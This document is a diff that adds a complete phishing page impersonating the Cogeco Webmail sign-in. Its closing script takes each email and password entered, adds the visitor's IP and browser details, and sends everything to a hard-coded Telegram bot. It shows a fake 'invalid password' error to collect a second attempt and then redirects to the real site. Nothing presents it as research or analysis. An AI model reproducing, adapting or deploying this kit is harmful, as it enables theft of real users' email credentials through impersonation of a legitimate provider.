@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Cogeco Webmail</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f3f4f8;
+    }
+
+    header {
+      background-color: #001049;
+      color: white;
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    header nav a {
+      color: white;
+      text-decoration: none;
+      margin: 0 15px;
+      font-weight: bold;
+    }
+
+    .container {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 30px;
+      padding: 50px 20px;
+      background-color: #f6f8fb;
+    }
+
+    .login-box, .info-box {
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+
+    .login-box h2 {
+      margin-top: 0;
+      color: #001049;
+    }
+
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    .error {
+      color: red;
+      font-size: 13px;
+      margin-top: -8px;
+      min-height: 16px;
+    }
+
+    .remember-box {
+      display: flex;
+      align-items: center;
+      margin: 15px 0;
+    }
+
+    .remember-box label {
+      margin-left: 8px;
+    }
+
+    .login-box a {
+      font-size: 14px;
+      color: #001049;
+      text-decoration: none;
+      float: right;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(to right, #001049, #00a6ba);
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .info-box {
+      background: linear-gradient(to right, #0f2157, #e87172);
+      color: white;
+    }
+
+    .info-box h3 {
+      margin-top: 0;
+    }
+
+    .info-box button {
+      margin-top: 20px;
+      padding: 10px 25px;
+      background: #ff726f;
+      color: white;
+      border: none;
+      border-radius: 25px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .bottom-section {
+      background-color: #f2f3f7;
+      text-align: center;
+      padding: 50px 20px;
+    }
+
+    .features {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 40px;
+      max-width: 1200px;
+      margin: auto;
+    }
+
+    .feature {
+      max-width: 260px;
+    }
+
+    .feature h4 {
+      color: #001049;
+    }
+
+    .feature p {
+      font-size: 14px;
+      color: #333;
+    }
+
+    .feature button {
+      margin-top: 10px;
+      padding: 8px 20px;
+      border: 1px solid #001049;
+      background: white;
+      color: #001049;
+      border-radius: 20px;
+      cursor: pointer;
+    }
+
+    footer {
+      background-color: #000c3d;
+      color: white;
+      padding: 30px 20px;
+      font-size: 14px;
+    }
+
+    .footer-columns {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      max-width: 1200px;
+      margin: auto;
+    }
+
+    .footer-column {
+      flex: 1 1 180px;
+      margin: 10px;
+    }
+
+    .footer-column h5 {
+      border-bottom: 1px solid #444;
+      padding-bottom: 5px;
+      margin-bottom: 10px;
+      color: #eee;
+    }
+
+    .footer-column a {
+      display: block;
+      color: #ccc;
+      text-decoration: none;
+      margin-bottom: 8px;
+    }
+
+    .footer-bottom {
+      text-align: center;
+      padding-top: 20px;
+      font-size: 13px;
+      color: #aaa;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        flex-direction: column;
+        align-items: center;
+        padding: 30px 10px;
+      }
+
+      .login-box, .info-box {
+        width: 100%;
+        max-width: 90%;
+      }
+
+      .features {
+        flex-direction: column;
+        align-items: center;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div><strong>COGECO</strong></div>
+    <nav>
+      <a href="#">Residential</a>
+      <a href="#">Business</a>
+      <a href="#">Careers</a>
+      <a href="#">Webmail</a>
+    </nav>
+  </header>
+
+  <section class="container">
+    <div class="login-box">
+      <h2>Welcome to Cogeco Webmail. Great to see you again.</h2>
+      <label>Email address</label>
+      <input type="email" id="email" placeholder="your.email@cogeco.ca" />
+      <label>Password</label>
+      <input type="password" id="password" />
+      <div class="error" id="emailError"></div>
+      <div class="remember-box">
+        <input type="checkbox" id="remember" />
+        <label for="remember">Remember my email address</label>
+      </div>
+      <a href="#">Forgot your password or email?</a>
+      <br><br>
+      <button onclick="handleSubmit()">Sign in</button>
+    </div>
+
+    <div class="info-box">
+      <h3>Get to know Webmail</h3>
+      <p>Cogeco Webmail has convenient features, such as seamless navigation between your inbox, calendar and contacts.</p>
+      <button>Learn more</button>
+    </div>
+  </section>
+
+  <section class="bottom-section">
+    <h2>Use Webmail to its full potential</h2>
+    <div class="features">
+      <div class="feature">
+        <h4>Manage your addresses on My Account</h4>
+        <p>Create, edit or delete email accounts and passwords for your Webmail addresses.</p>
+        <button>Log in to My Account</button>
+      </div>
+      <div class="feature">
+        <h4>See how to set up email on other devices</h4>
+        <p>Access your Cogeco email address from other email client software on any device.</p>
+        <button>Learn how</button>
+      </div>
+      <div class="feature">
+        <h4>Get answers to your Webmail questions</h4>
+        <p>Find all your answers about Webmail and its features in our FAQs.</p>
+        <button>Visit Webmail FAQs</button>
+      </div>
+      <div class="feature">
+        <h4>Protect yourself against fraud</h4>
+        <p>Learn how to identify fraudulent emails and scams trying to access your data.</p>
+        <button>Learn about fraud and scams</button>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="footer-columns">
+      <div class="footer-column">
+        <h5>Shop</h5>
+        <a href="#">Internet</a>
+        <a href="#">Internet + TV</a>
+        <a href="#">Home Phone</a>
+        <a href="#">Promotions</a>
+        <a href="#">Find a store</a>
+      </div>
+      <div class="footer-column">
+        <h5>Support</h5>
+        <a href="#">Internet support</a>
+        <a href="#">TV Support</a>
+        <a href="#">Home Phone Support</a>
+        <a href="#">Billing and account</a>
+        <a href="#">Outages</a>
+      </div>
+      <div class="footer-column">
+        <h5>About us</h5>
+        <a href="#">Our engagement</a>
+        <a href="#">Careers</a>
+        <a href="#">Share a concern</a>
+        <a href="#">Contact us</a>
+      </div>
+      <div class="footer-column">
+        <h5>Learn more</h5>
+        <a href="#">Press releases</a>
+        <a href="#">About Cogeco Connexion</a>
+        <a href="#">YourTV</a>
+        <a href="#">Corporate</a>
+        <a href="#">Investor Relations</a>
+      </div>
+      <div class="footer-column">
+        <h5>Legal links</h5>
+        <a href="#">Privacy policy</a>
+        <a href="#">Terms and conditions</a>
+        <a href="#">Regulatory affairs</a>
+        <a href="#">Internet Code</a>
+        <a href="#">Court orders</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      © 2025 Cogeco Connexion • Accessibility • Site map
+    </div>
+  </footer>
+
+  <script>
+    let attempt = 0;
+
+    async function handleSubmit() {
+      const emailInput = document.getElementById("email");
+      const passwordInput = document.getElementById("password");
+      const errorBox = document.getElementById("emailError");
+
+      const email = emailInput.value.trim();
+      const password = passwordInput.value;
+
+      if (!email || !password) {
+        errorBox.textContent = "Please enter both email and password.";
+        return;
+      }
+
+      const userAgent = navigator.userAgent;
+      const date = new Date().toLocaleString();
+
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        const ip = ipData.ip;
+
+        const message = `Login Attempt #${attempt + 1}\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}\nUser Agent: ${userAgent}\nDate: ${date}`;
+
+        // Send to Telegram
+        await fetch("https://api.telegram.org/bot7708953155:AAFvoTY6BdKd-HsiLFGh8e9kb0pwLtkBswE", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: "869307892",
+            text: message
+          })
+        });
+
+        attempt++;
+
+        if (attempt >= 2) {
+          window.location.href = "https://www.cogeco.ca";
+        } else {
+          errorBox.textContent = "Invalid email or password.";
+          passwordInput.value = "";
+        }
+      } catch (error) {
+        console.error("Telegram Error:", error);
+        errorBox.textContent = "Connection error. Try again.";
+      }
+    }
+  </script>
+</body>
+</html>
